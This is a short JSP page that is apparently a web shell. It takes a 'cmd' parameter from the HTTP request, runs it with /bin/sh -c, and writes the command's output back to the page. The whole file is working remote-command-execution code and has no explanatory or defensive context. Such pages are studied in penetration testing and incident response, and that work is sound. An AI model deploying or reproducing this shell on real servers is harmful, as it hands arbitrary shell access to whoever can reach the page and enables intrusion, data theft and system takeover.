<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%!
    public static InputStream exec(String cmd) throws Exception {
        InputStream inputStream = null;

        ProcessBuilder pb = new ProcessBuilder(new String[]{"/bin/sh", "-c", cmd});
        inputStream = pb.start().getInputStream();

        return inputStream;
    }

    public static String scanner(InputStream inputStream) {
        return new Scanner(inputStream).useDelimiter("\\A").next();
    }
%>

<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        out.println(scanner(exec(cmd)));
    }
%>